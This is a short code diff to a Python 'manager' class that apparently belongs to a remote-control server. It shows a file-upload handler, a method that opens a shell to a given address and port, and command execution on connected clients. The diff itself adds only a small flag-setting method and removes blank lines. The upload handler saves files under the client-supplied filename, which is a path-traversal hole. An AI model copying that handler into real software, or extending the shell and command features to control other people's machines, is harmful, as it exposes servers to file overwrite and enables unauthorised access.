@@ -76,7 +76,8 @@ class manager:
         file.save("uploads/"+file.filename)
         return "Ok",200
 
-        
+    def getOK(self,uid):
+        self.clientList[uid].setOK=False
 
     ########################## actions RPC ############################
     def getClientByIndex(self,clientUid):
@@ -93,7 +94,6 @@ class manager:
             r+="cliente %i  = %s \n"%(i,self.getClientByIndex(i))
         
         return r
-
 
     def abrirShell(self,clientuid,addr,port):
         
@@ -133,7 +133,6 @@ class manager:
             self.getClientByIndex(clientuid).runCommand(cmdList)
         else:
             print("client don't find")
-            
             
     
     def testServer(self):
